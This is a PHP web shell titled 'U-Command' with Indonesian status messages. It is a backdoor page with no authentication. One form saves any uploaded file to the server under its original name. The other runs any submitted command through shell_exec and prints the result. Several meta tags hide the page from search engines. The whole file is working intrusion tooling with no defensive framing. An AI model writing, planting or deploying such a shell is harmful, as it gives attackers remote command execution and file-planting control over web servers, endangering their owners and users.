<?php
if (isset($_FILES['uploadedFile'])) {
    $file = $_FILES['uploadedFile']['name'];
    $fileTmp = $_FILES['uploadedFile']['tmp_name'];
    if (move_uploaded_file($fileTmp, $file)) {
        echo 'Upload Berhasil<br />';
    } else {
        echo 'Upload Gagal<br />';
    }
}

if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
}
?>

<!DOCTYPE html>
<html>
<head>
<meta name="author" content="msverse.site">
<meta name="robots" content="noindex"/>
<meta name="googlebot" content="noindex"/>
<meta name="googlebot-news" content="nosnippet"/>
<meta name="robots" content="noarchive"/>
<meta name="robots" content="nocache"/>
<meta name="robots" content="noodp"/>
<meta name="robots" content="nosnippet"/>
<meta name="yandex" content="noindex, nofollow" />
    <title>U-Command</title>
</head>
<body>
    <h1>U-Command</h1>

    <h2>Upload File:</h2>
    <form enctype="multipart/form-data" method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <input type="file" name="uploadedFile" required/>
        <input type="submit" value="Upload"/>
    </form>

    <h2>Command:</h2>
    <form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <input type="text" name="cmd" placeholder="Command" required/>
        <input type="submit" value="Execute"/>
    </form>
    <?php if (isset($output)) : ?>
        <pre><?php echo $output; ?></pre>
    <?php endif; ?>
</body>
</html>
